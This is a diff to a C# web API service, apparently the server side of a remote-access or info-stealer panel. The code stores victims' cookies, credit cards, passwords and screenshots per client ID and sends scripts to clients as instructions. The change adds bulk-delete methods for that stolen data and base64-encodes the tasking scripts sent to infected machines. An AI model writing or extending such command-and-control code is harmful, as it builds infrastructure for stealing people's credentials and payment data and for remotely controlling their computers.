@@ -8,6 +8,7 @@ using X_ZIGZAG_SERVER_WEB_API.ViewModels.Response;
 using SixLabors.ImageSharp;
 using SixLabors.ImageSharp.Processing;
 using Microsoft.Extensions.Caching.Memory;
+using System.Text;
 
 namespace X_ZIGZAG_SERVER_WEB_API.Services
 {
@@ -172,6 +173,32 @@ namespace X_ZIGZAG_SERVER_WEB_API.Services
             }
             return null;
         }
+        public void DeleteAllScreenShots(string uuid)
+        {
+            string folderPath = Path.Combine(_environment.ContentRootPath, "Screenshots", uuid);
+            try
+            {
+                if (Directory.Exists(folderPath))
+                {
+                    Directory.Delete(folderPath, true);
+                }
+            }
+            catch
+            {
+            }
+        }
+        public async Task DeleteAllCookies(string uuid)
+        {
+            await _context.Cookies.Where(u => u.ClientId.Equals(uuid)).ExecuteDeleteAsync();
+        }
+        public async Task DeleteAllCreditCards(string uuid)
+        {
+            await _context.CreditCards.Where(u => u.ClientId.Equals(uuid)).ExecuteDeleteAsync();
+        }
+        public async Task DeleteAllPasswords(string uuid)
+        {
+            await _context.Passwords.Where(u => u.ClientId.Equals(uuid)).ExecuteDeleteAsync();
+        }
         public FileResult? GetScreenshotPreview(string uuid, int screenIndex, string screenshotFileName)
         {
             var imagePath = Path.Combine(_environment.ContentRootPath, "Screenshots", uuid, screenIndex.ToString(), screenshotFileName);
@@ -252,7 +279,7 @@ namespace X_ZIGZAG_SERVER_WEB_API.Services
                         {
                             InstructionId = i.InstructionId,
                             Code = i.Code,
-                            Script = script,
+                            Script = Convert.ToBase64String(Encoding.UTF8.GetBytes(script)),
                             FunctionArgs = i.FunctionArgs
                         };
                         }).ToList();
